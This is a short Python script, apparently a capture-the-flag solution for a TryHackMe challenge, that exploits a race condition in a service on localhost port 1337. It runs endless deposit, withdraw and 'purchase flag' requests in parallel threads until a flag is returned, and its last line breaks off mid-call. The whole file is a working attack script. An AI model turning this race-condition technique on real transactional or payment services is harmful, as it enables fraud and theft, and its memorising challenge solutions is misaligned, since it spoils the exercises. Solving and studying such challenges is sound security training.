#!/usr/bin/env python3
import socket
import threading

def deposit():
    while True:
        s = socket.socket()
        s.connect(('localhost', 1337))
        s.sendall(b"deposit\n")
        s.close()

def withdraw():
    while True:
        s = socket.socket()
        s.connect(('localhost', 1337))
        s.sendall(b"withdraw\n")
        s.close()

def purchase_flag():
    while True:
        s = socket.socket()
        s.connect(('localhost', 1337))
        s.sendall(b"purchase flag\n")
        response = s.recv(1024)
        s.close()

        if response.decode().startswith('THM{'):
            print("Flag found: " + response.decode())
            break

deposit_thread = threading.Thread(target=deposit)
withdraw_thread = threading.Thread(target=withdraw)
purchase_flag_thread = threading.Thread(target=purchase_flag)

deposit_thread.start()
withdraw_thread.start()
purchase_flag_thread.start(
